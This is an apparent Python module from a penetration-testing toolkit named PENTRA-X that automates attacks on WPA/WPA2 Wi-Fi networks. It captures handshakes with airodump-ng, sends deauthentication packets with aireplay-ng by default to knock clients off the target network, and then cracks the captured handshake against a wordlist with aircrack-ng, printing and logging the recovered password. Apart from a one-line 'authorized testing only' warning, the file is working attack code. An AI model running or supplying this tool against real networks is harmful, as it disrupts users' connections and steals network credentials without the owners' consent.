#!/usr/bin/env python3
"""
PENTRA-X Handshake Capture
Capture WPA/WPA2 handshakes using airodump-ng.
"""

import subprocess
import os
from pathlib import Path
from typing import Optional

from ...core.colors import Colors, success, error, info, warning, header
from ...core.utils import safe_input, safe_press_enter, check_tool_installed, require_root
from ...core.logging import get_logger, log_result
from ...core.config import get_config


@require_root
def capture_handshake() -> Optional[str]:
    """
    Capture WPA/WPA2 handshake.
    
    Returns:
        Path to captured handshake file or None
    """
    logger = get_logger()
    config = get_config()
    
    header("WPA/WPA2 Handshake Capture")
    
    warning("FOR AUTHORIZED TESTING ONLY!")
    
    # Check tools
    for tool in ['airodump-ng', 'aireplay-ng']:
        if not check_tool_installed(tool):
            error(f"{tool} not installed")
            info("Install aircrack-ng: sudo apt install aircrack-ng")
            safe_press_enter()
            return None
    
    # Get interface
    mon_iface = config.get('wireless.monitor_interface', 'wlan0mon')
    interface = safe_input(f"{Colors.OKGREEN}Monitor interface (default: {mon_iface}): {Colors.ENDC}")
    interface = interface.strip() if interface else mon_iface
    
    # Get target info
    bssid = safe_input(f"{Colors.OKGREEN}Target BSSID (MAC address): {Colors.ENDC}")
    if not bssid:
        error("BSSID required")
        safe_press_enter()
        return None
    bssid = bssid.strip().upper()
    
    channel = safe_input(f"{Colors.OKGREEN}Channel: {Colors.ENDC}")
    if not channel:
        error("Channel required")
        safe_press_enter()
        return None
    
    # Output directory
    handshake_dir = config.get('wireless.handshake_dir', '~/.pentrax/handshakes')
    handshake_dir = os.path.expanduser(handshake_dir)
    os.makedirs(handshake_dir, exist_ok=True)
    
    output_prefix = f"{handshake_dir}/capture_{bssid.replace(':', '')}"
    
    logger.tool_start("Handshake Capture", bssid)
    
    info(f"Starting capture on channel {channel}...")
    info("Waiting for handshake (this may take several minutes)")
    info("Press Ctrl+C when handshake is captured")
    
    try:
        # Start airodump-ng
        airodump_cmd = [
            'airodump-ng',
            '-c', channel,
            '--bssid', bssid,
            '-w', output_prefix,
            interface
        ]
        
        # Option to send deauth
        send_deauth = safe_input(f"{Colors.OKGREEN}Send deauth packets to speed up capture? (Y/n): {Colors.ENDC}")
        
        # Start capture in background
        airodump_proc = subprocess.Popen(airodump_cmd)
        
        if send_deauth.lower() != 'n':
            info("Sending deauth packets...")
            # Wait a moment then send deauth
            import time
            time.sleep(3)
            
            deauth_cmd = [
                'aireplay-ng',
                '--deauth', '5',
                '-a', bssid,
                interface
            ]
            subprocess.run(deauth_cmd, capture_output=True)
        
        # Wait for capture
        airodump_proc.wait()
        
    except KeyboardInterrupt:
        info("Capture stopped")
    
    # Check for capture file
    cap_file = f"{output_prefix}-01.cap"
    if os.path.exists(cap_file):
        success(f"Capture saved: {cap_file}")
        info("Crack with: aircrack-ng -w wordlist.txt " + cap_file)
        
        log_result("handshake_capture", f"BSSID: {bssid}, File: {cap_file}")
        logger.tool_end("Handshake Capture", success=True)
        
        safe_press_enter()
        return cap_file
    else:
        warning("No handshake captured")
        logger.tool_end("Handshake Capture", success=False)
        
        safe_press_enter()
        return None


@require_root
def crack_handshake(cap_file: Optional[str] = None) -> Optional[str]:
    """
    Crack WPA/WPA2 handshake using aircrack-ng.
    
    Args:
        cap_file: Path to capture file
        
    Returns:
        Cracked password or None
    """
    logger = get_logger()
    config = get_config()
    
    header("WPA/WPA2 Handshake Cracker")
    
    if not check_tool_installed('aircrack-ng'):
        error("aircrack-ng not installed")
        info("Install with: sudo apt install aircrack-ng")
        safe_press_enter()
        return None
    
    # Get capture file
    if not cap_file:
        cap_file = safe_input(f"{Colors.OKGREEN}Enter capture file path (.cap): {Colors.ENDC}")
        if not cap_file:
            return None
        cap_file = cap_file.strip()
    
    if not os.path.exists(cap_file):
        error(f"File not found: {cap_file}")
        safe_press_enter()
        return None
    
    # Get wordlist
    default_wordlist = config.get('wordlists.passwords', '/usr/share/wordlists/rockyou.txt')
    wordlist = safe_input(f"{Colors.OKGREEN}Wordlist (default: {default_wordlist}): {Colors.ENDC}")
    wordlist = wordlist.strip() if wordlist else default_wordlist
    
    if not os.path.exists(wordlist):
        error(f"Wordlist not found: {wordlist}")
        safe_press_enter()
        return None
    
    logger.tool_start("Handshake Crack", cap_file)
    
    info(f"Cracking {cap_file} with {wordlist}...")
    info("This may take a long time depending on wordlist size")
    
    try:
        result = subprocess.run(
            ['aircrack-ng', '-w', wordlist, cap_file],
            capture_output=True,
            text=True,
            timeout=7200  # 2 hours max
        )
        
        print(result.stdout)
        
        # Check for success
        if 'KEY FOUND!' in result.stdout:
            # Extract password
            for line in result.stdout.split('\n'):
                if 'KEY FOUND!' in line:
                    password = line.split('[')[1].split(']')[0].strip()
                    success(f"Password found: {password}")
                    
                    log_result("handshake_crack", f"File: {cap_file}, Password: {password}")
                    logger.tool_end("Handshake Crack", success=True)
                    
                    safe_press_enter()
                    return password
        
        warning("Password not found in wordlist")
        logger.tool_end("Handshake Crack", success=True)
        
    except subprocess.TimeoutExpired:
        warning("Cracking timed out after 2 hours")
        logger.tool_end("Handshake Crack", success=False)
    except KeyboardInterrupt:
        warning("Cracking interrupted")
        logger.tool_end("Handshake Crack", success=False)
    except Exception as e:
        error(f"Cracking failed: {e}")
        logger.tool_end("Handshake Crack", success=False)
    
    safe_press_enter()
    return None


if __name__ == "__main__":
    print("1) Capture handshake")
    print("2) Crack handshake")
    choice = input("Select: ")
    if choice == '1':
        capture_handshake()
    elif choice == '2':
        crack_handshake()
